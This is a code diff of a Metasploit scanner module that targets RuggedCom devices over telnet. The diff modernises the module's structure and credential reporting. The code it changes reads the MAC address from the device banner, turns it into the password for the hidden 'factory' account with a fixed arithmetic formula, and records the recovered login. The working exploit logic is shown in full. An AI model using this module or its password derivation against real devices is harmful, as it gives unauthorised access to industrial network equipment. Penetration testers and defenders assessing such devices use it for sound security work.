@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Telnet
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -37,17 +34,17 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(23),
         OptString.new('USERNAME', [ true, 'The username to authenticate as', 'factory']),
         OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])
-      ], self.class)
+      ])
   end
 
 
   def mac_to_password(mac)
-    print_status ("MAC Address: #{mac}")
+    print_status("MAC Address: #{mac}")
     mac_clean = mac.gsub("-","")
     mac_reverse = mac_clean.each_char.each_slice(2).to_a.reverse.join
     mac_reverse << "0000"
     pass = mac_reverse.hex % 999999929
-    print_status ("Password: #{pass}")
+    print_status("Password: #{pass}")
     return pass.to_s
   end
 
@@ -58,6 +55,32 @@ class Metasploit3 < Msf::Auxiliary
     return so_version << "  " << product
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'telnet',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
 
   def run_host(ip)
     to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
@@ -70,16 +93,7 @@ class Metasploit3 < Msf::Auxiliary
           mac  = banner_santized.match(/((?:[0-9a-f]{2}[-]){5}[0-9a-f]{2})/i)[0]
           password = mac_to_password(mac)
           info = get_info(banner_santized)
-          report_auth_info(
-            :host  => rhost,
-            :port => rport,
-            :sname => 'telnet',
-            :user => 'factory',
-            :pass => password,
-            :source_type => "user_supplied",
-            :proof => info,
-            :active => true
-          )
+          report_cred(ip: rhost, port: rport, user:'factory', password: password, proof: banner_santized)
           break
         else
           print_status("It doesn't seem to be a RuggedCom service.")
